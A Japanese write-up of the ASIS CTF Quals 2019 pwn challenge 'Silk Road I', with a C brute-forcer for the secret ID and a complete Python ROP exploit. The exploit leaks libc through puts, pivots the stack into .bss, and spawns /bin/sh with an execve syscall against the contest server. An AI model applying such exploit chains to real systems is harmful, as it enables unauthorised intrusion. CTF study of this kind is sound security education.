# [pwn 83pts] Silk Road I - ASIS CTF Quals 2019
64ビットでNX以外無効です。
```
$ checksec -f silkroad.elf
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No	0		5	silkroad.elf
```
IDAで見ると単純なスタックオーバーフローがあります。
が、その前に謎の処理を解析してハッシュが一致するような入力を与える必要があります。
リバージングじゃん......

次のコードで正しい入力を特定します。
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>

void ltoa(long val, char *ptr)
{
  int i;
  int digit = (int)log10((double)val);
  ptr[digit + 1] = 0;
  for(i = digit; i >= 0; i--) {
    ptr[i] = 0x30 + (val % 10);
    val /= 10;
  }
}

int main()
{
  char str_secret[10];
  int x1, x2, y1 ,y2;
  for(long secret = 10000; secret < 999999999; secret++) {
    if (secret % 100000 == 0) {
      printf("%ld\n", secret);
    }
    ltoa(secret, str_secret);
    int l = strlen(str_secret);
    if ((secret % (l + 2) == 0) && (str_secret[4] == '1')) {
      x1 = secret / 100000;
      x2 = secret % 10000;
      if ((((x2 % 100) / 10 + (x2 / 1000) * 10) - ((x1 / 1000) *10 + x1 % 10) == 1) && (((x1 / 100) % 10) * 10 + (x1 / 10) % 10 + ((x2 %1000) / 100 + ((x2 % 100) / 10) * 10) * -2 == 8)) {
	y1 = (x1 % 10) * 10 + (x1 / 100) % 10;
	y2 = ((x2 / 100) % 10) * 10 + x2 % 10;
	if ((y1 / y2 == 3) && (y1 % y2 == 0)) {
	  if (secret % (x1 * x2) == (l + 2) * (l + 2) * (l + 2) + 6) {
	    printf("%ld\n", secret);
	    break;
	  }
	}
      }
    }
  }
  return 0;
}
```

で、この結果を使います。
```python
from ptrlib import *

secret = 790317143

libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
elf = ELF("./silkroad.elf")
#sock = Process("./silkroad.elf")
sock = Socket("82.196.10.106", 58399)
#_ = input()

plt_read = 0x004010a0
plt_puts = 0x00401070
rop_pop_rdi = 0x00401bab
addr_start = 0x401150

# Stage 1
payload = b'A' * 0x48
payload += p64(rop_pop_rdi)
payload += p64(elf.got("puts"))
payload += p64(plt_puts)
#payload += p64(rop_pop_rdi)
#payload += p64(elf.got("putchar"))
#payload += p64(plt_puts)
payload += p64(addr_start)
sock.recvuntil("ID: ")
sock.sendline(str(secret))
sock.recvuntil("nick: ")
sock.sendline(b"DreadPirateRobertsAiz\x00" + payload)
sock.recvline()
addr_puts = u64(sock.recvline().rstrip())
#addr_putchar = u64(sock.recvline().rstrip())
libc_base = addr_puts - libc.symbol("puts")
dump("addr_puts = " + hex(addr_puts))
#dump("addr_putchar = " + hex(addr_putchar))
dump("libc base = " + hex(libc_base))
#addr_system = libc_base + libc.symbol("system")
addr_binsh = libc_base + next(libc.search("/bin/sh"))
addr_gets = libc_base + libc.symbol("gets")

rop_leave_ret = 0x00401298
rop_pop_rax = libc_base + 0x000439c7
rop_pop_rsi = libc_base + 0x00023e6a
rop_pop_rdx = libc_base + 0x00001b96
rop_pop_rbp = libc_base + 0x00021353
rop_syscall = libc_base + 0x000013c0

stage3 = p64(0xdeadbeef)
stage3 += p64(rop_pop_rdi)
stage3 += p64(addr_binsh)
stage3 += p64(rop_pop_rsi)
stage3 += p64(0)
stage3 += p64(rop_pop_rdx)
stage3 += p64(0)
stage3 += p64(rop_pop_rax)
stage3 += p64(59)
stage3 += p64(rop_syscall)

# Stage 2
payload = b'A' * 0x48
payload += p64(rop_pop_rdi)
payload += p64(elf.section(".bss") + 0x100)
payload += p64(addr_gets)
payload += p64(rop_pop_rbp)
payload += p64(elf.section(".bss") + 0x100)
payload += p64(rop_leave_ret)
sock.recvuntil("ID: ")
sock.sendline(str(secret))
sock.recvuntil("nick: ")
sock.sendline(b"DreadPirateRobertsAiz\x00" + payload)
sock.recvline()

# Stage 3
sock.sendline(stage3)

sock.interactive()
```

# 感想
なんでこんな問題を出したんだ？
